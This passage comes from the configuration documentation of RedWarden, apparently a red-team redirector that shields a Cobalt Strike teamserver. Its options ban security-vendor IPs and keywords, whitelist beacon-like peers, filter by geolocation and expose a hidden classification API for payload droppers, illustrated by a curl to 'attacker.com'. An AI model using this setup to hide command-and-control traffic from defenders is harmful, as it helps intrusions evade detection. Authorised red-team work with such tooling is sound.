  - 127.0.0.0/24


#
# Maintain a volatile, dynamic list of whitelisted Peers (IPv4 addresses) based on a number of requests
# they originate that were allowed and passed to Teamserver.
#
# This option cuts down request processing time since whenever a request coming from a previously whitelisted
# peers gets processed, it will be accepted right away having observed that the peer was allowed to pass
# N requests to the Teamserver on a previous occassions.
#
# This whitelist gets cleared along with RedWarden being terminated. It is only held up in script's memory.
# 
# Paramters:
#   - number_of_valid_http_get_requests: defines number of successful http-get requests (polling Teamserver)
#                                        that determine whether Peer can be trusted.
#   - number_of_valid_http_post_requests: defines number of successful http-post requests (sending command
#                                         results to the TS) that determine whether Peer can be trusted.
#
# Value of 0 denotes disabled counting of a corresponding type of requests. 
# Function disabled if configuration option is missing.
#
# Default: (dynamic whitelist enabled)
#       number_of_valid_http_get_requests: 15
#       number_of_valid_http_post_requests: 5
#
add_peers_to_whitelist_if_they_sent_valid_requests:
  number_of_valid_http_get_requests: 15
  number_of_valid_http_post_requests: 5


#
# Ban peers based on their IPv4 address. The blacklist with IP address to check against is specified
# in 'ip_addresses_blacklist_file' option.
#
# Default: True
#
ban_blacklisted_ip_addresses: True

#
# Specifies external list of CIDRs with IPv4 addresses to ban. Each entry in that file
# can contain a single IPv4, a CIDR or a line with commentary in following format:
#     1.2.3.4/24 # Super Security System
#
# Default: plugins/malleable_banned_ips.txt
#
ip_addresses_blacklist_file: plugins/malleable_banned_ips.txt

#
# Specifies external list of keywords to ban during reverse-IP lookup, User-Agents or 
# HTTP headers analysis stage. The file can contain lines beginning with '#' to mark comments.
#
# Default: plugins/malleable_banned_words.txt
#
banned_agents_words_file: plugins/malleable_banned_words.txt

#
# Specifies external list of phrases that should override banned phrases in case of ambiguity.
# If the request was to be banned because of a ambigue phrase, the override agents file can
# make the request pass blocking logic if it contained "allowed" phrase.
#
# Default: plugins/malleable_words_override.txt
#
override_banned_agents_file: plugins/malleable_words_override.txt

#
# Ban peers based on their IPv4 address' resolved ISP/Organization value or other details. 
# Whenever a peer connects to our proxy, we'll take its IPv4 address and use one of the specified
# APIs to collect all the available details about the address. Whenever a banned word 
# (of a security product) is found in those details - peer will be banned.
# List of API keys for supported platforms are specified in ''. If there are no keys specified, 
# only providers that don't require API keys will be used (e.g. ip-api.com, ipapi.co)
#
# This setting affects execution of policy:
#   - drop_ipgeo_metadata_containing_banned_keywords
#
# Default: True
#
verify_peer_ip_details: True

#
# Specifies a list of API keys for supported API details collection platforms. 
# If 'verify_peer_ip_details' is set to True and there is at least one API key given in this option, the
# proxy will collect details of inbound peer's IPv4 address and verify them for occurences of banned words
# known from various security vendors. Do take a note that various API details platforms have their own
# thresholds for amount of lookups per month. By giving more than one API keys, the script will
# utilize them in a random order.
#
# To minimize number of IP lookups against each platform, the script will cache performed lookups in an
# external file named 'ip-lookups-cache.json'
#
# Supported IP Lookup providers:
#   - ip-api.com: No API key needed, free plan: 45 requests / minute
#   - ipapi.co: No API key needed, free plan: up to 30000 IP lookups/month and up to 1000/day.
#   - ipgeolocation.io: requires an API key, up to 30000 IP lookups/month and up to 1000/day.
#
# Default: empty dictionary
#
ip_details_api_keys: 
  #ipgeolocation_io: 0123456789abcdef0123456789abcdef
  ipgeolocation_io:


#
# Restrict incoming peers based on their IP Geolocation information. 
# Available only if 'verify_peer_ip_details' was set to True. 
# IP Geolocation determination may happen based on the following supported characteristics:
#   - organization, 
#   - continent, 
#   - continent_code, 
#   - country, 
#   - country_code, 
#   - city, 
#   - timezone
#
# The Peer will be served if at least one geolocation condition holds true for him 
# (inclusive/alternative arithmetics).
#
# If no determinants are specified, IP Geolocation will not be taken into consideration while accepting peers.
# If determinants are specified, only those peers whose IP address matched geolocation determinants will be accepted.
#
# Each of the requirement values may be regular expression. Matching is case-insensitive.
#
# Following (continents_code, continent) pairs are supported:
#    ('AF', 'Africa'),
#    ('AN', 'Antarctica'),
#    ('AS', 'Asia'),
#    ('EU', 'Europe'),
#    ('NA', 'North america'),
#    ('OC', 'Oceania'),
#    ('SA', 'South america)' 
#
# Proper IP Lookup details values can be established by issuing one of the following API calls:
#   $ curl -s 'https://ipapi.co/TARGET-IP-ADDRESS/json/' 
#   $ curl -s 'http://ip-api.com/json/TARGET-IP-ADDRESS'
#
# The organization/isp/as/asn/org fields will be merged into a common organization list of values.
#
ip_geolocation_requirements:
  organization:
    #- My\s+Target\+Company(?: Inc.)?
  continent:
  continent_code:
  country:
  country_code:
  city:
  timezone:

#
# Fine-grained requests dropping policy - lets you decide which checks
# you want to have enforced and which to skip by setting them to False
#
# Default: all checks enabled
#
policy:
  # [IP: ALLOW, reason:0] Request conforms ProxyPass entry (url="..." host="..."). Passing request to specified host
  allow_proxy_pass: True
  # [IP: ALLOW, reason:2] Peer's IP was added dynamically to a whitelist based on a number of allowed requests
  allow_dynamic_peer_whitelisting: True
  # [IP: DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
  drop_invalid_useragent: True
  # [IP: DROP, reason:2] HTTP header name contained banned word
  drop_http_banned_header_names: True
  # [IP: DROP, reason:3] HTTP header value contained banned word:
  drop_http_banned_header_value: True
  # [IP: DROP, reason:4b] peer's reverse-IP lookup contained banned word
  drop_dangerous_ip_reverse_lookup: True
  # [IP: DROP, reason:4e] Peer's IP geolocation metadata contained banned keyword! Peer banned in generic fashion.
  drop_ipgeo_metadata_containing_banned_keywords: True
  # [IP: DROP, reason:5] HTTP request did not contain expected header
  drop_malleable_without_expected_header: True
  # [IP: DROP, reason:6] HTTP request did not contain expected header value:
  drop_malleable_without_expected_header_value: True
  # [IP: DROP, reason:7] HTTP request did not contain expected (metadata|id|output) section header:
  drop_malleable_without_expected_request_section: True
  # [IP: DROP, reason:8] HTTP request was expected to contain (metadata|id|output) section with parameter in URI:
  drop_malleable_without_request_section_in_uri: True
  # [IP: DROP, reason:9] Did not found append pattern:
  drop_malleable_without_prepend_pattern: True
  # [IP: DROP, reason:10] Did not found append pattern:
  drop_malleable_without_apppend_pattern: True
  # [IP: DROP, reason:11] Requested URI does not aligns any of Malleable defined variants:
  drop_malleable_unknown_uris: True
  # [IP: DROP, reason:12] HTTP request was expected to contain <> section with URI-append containing prepend/append fragments
  drop_malleable_with_invalid_uri_append: True


#
# If RedWarden validates inbound request's HTTP headers, according to policy drop_malleable_without_expected_header_value:
#   "[IP: DROP, reason:6] HTTP request did not contain expected header value:"
#
# and senses some header is missing or was overwritten along the wire, the request will be dropped. We can relax this policy
# a bit however, since there are situations in which Cache systems (such as Cloudflare) could tamper with our requests thus
# breaking Malleable contracts. What we can do is to specify list of headers, that should be overwritten back to their values
# defined in provided Malleable profile.
#
# So for example, if our profile expects:
#   header "Accept-Encoding" "gzip, deflate";
#
# but we receive a request having following header set instead:
#   Accept-Encoding: gzip
#
# Because it was tampered along the wire by some of the interim systems (such as web-proxies or caches), we can
# detect that and set that header's value back to what was expected in Malleable profile.
#
# In order to protect Accept-Encoding header, as an example, the following configuration could be used:
#   protect_these_headers_from_tampering:
#     - Accept-Encoding
#
#
# Default: <empty-list>
#
#protect_these_headers_from_tampering:
#  - Accept-Encoding


#
# Malleable Redirector plugin can act as a basic oracle API responding to calls
# containing full request contents with classification whether that request would be
# blocked or passed along. The API may be used by custom payload droppers, HTML Smuggling
# payloads or any other javascript-based landing pages.
#
# The way to invoke it is as follows:
#   1. Issue a POST request to the RedWarden server with the below specified URI in path.
#   2. Include following JSON in your POST request:
#
#   POST /malleable_redirector_hidden_api_endpoint
#   Content-Type: application/json
#
#     {
#         "peerIP" : "IP-of-connecting-Peer",
#         "headers" : {
#              "headerName1" : "headerValue1",
#              ...
#              "headerNameN" : "headerValueN",
#         },
#     }
# 
# If "peerIP" is empty (or was not given), RedWarden will try to extract peer's IP from HTTP 
# headers such as (X-Forwarded-For, CF-Connecting-IP, X-Real-IP, etc.). If no IP will be present
# in headers, an error will be returned.:
#
#     HTTP 404 Not Found
#     {
#         "error" : "number",
#         "message" : "explanation"
#     }
#
# RedWarden will take any non-empty field from a given JSON and evaluate it as it would do
# under currently provided configuration and all the knowledge it possesses. 
# The response will contain following JSON:
#
#    { 
#        "action": "allow|drop",
#        "peerIP" : "returned-peerIP",
#        "ipgeo" : {ip-geo-metadata-extracted}
#        "message": "explanation",
#        "reason": "reason",
#        "drop_type": "proxy|reset|redirect",
#        "action_url": ["proxy-URL-1|redirect-URL-1", ..., "proxy-URL-N|redirect-URL-N"]
#    }
#
# Availbale Allow/Drop reasons for this endpoint:
#    ALLOW:
#       - Reason: 99 - Peer IP and HTTP headers did not contain anything suspicious
#       - Reason: 1  - peer's IP address is whitelisted
#       - Reason: 2  - Peer's IP was added dynamically to a whitelist based on a number of allowed requests
#    DROP:
#       - Reason: 2 - HTTP header name contained banned word
#       - Reason: 3 - HTTP header value contained banned word
#       - Reason: 4a - Peer's IP address is blacklisted
#       - Reason: 4b - Peer's reverse-IP lookup contained banned word
#       - Reason: 4c - Peer's IP lookup organization field contained banned word
#       - Reason: 4d - Peer's IP geolocation DID NOT met expected conditions
#       - Reason: 4e - Peer's IP geolocation metadata contained banned keyword! Peer banned in generic fashion
#
# Sample curl to debug:
#   $ curl -sD- --request POST --data "{\"headers\":{\"Accept\": \"*/*\", \"Sec-Fetch-Site\": \"same-origin\", \
#        \"Sec-Fetch-Mode\": \"no-cors\", \"Sec-Fetch-Dest\": \"script\", \"Accept-Language\": \"en-US,en;q=0.9\", \
#        \"Cookie\": \"__cfduid2=cHux014r17SG3v4gPUrZ0BZjDabMTY2eWDj1tuYdREBg\", \"User-Agent\": \
#        \"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\"}}" \
#        https://attacker.com/12345678-9abc-def0-1234-567890abcdef
#
# Default: Turned off / not available
#
#malleable_redirector_hidden_api_endpoint: /12345678-9abc-def0-1234-567890abcdef

```


### TODO:

- Implement support for JA3 signatures in both detection & blocking and impersonation to fake nginx/Apache2/custom setups.
- Add some unique beacons tracking logic to offer flexilibity of refusing staging and communication processes at the proxy's own discretion
- Introduce day of time constraint when offering redirection capabilities
- Add Proxy authentication and authorization logic on CONNECT/relay.
- Add Mobile users targeted redirection
- Add configuration options to define custom HTTP headers to be injected, or ones to be removed
- Add configuration options to require specifiec HTTP headers to be present in requests passing ProxyPass criteria.

### Author

Mariusz B. / mgeeky, '19-'21
<mb@binary-offensive.com>

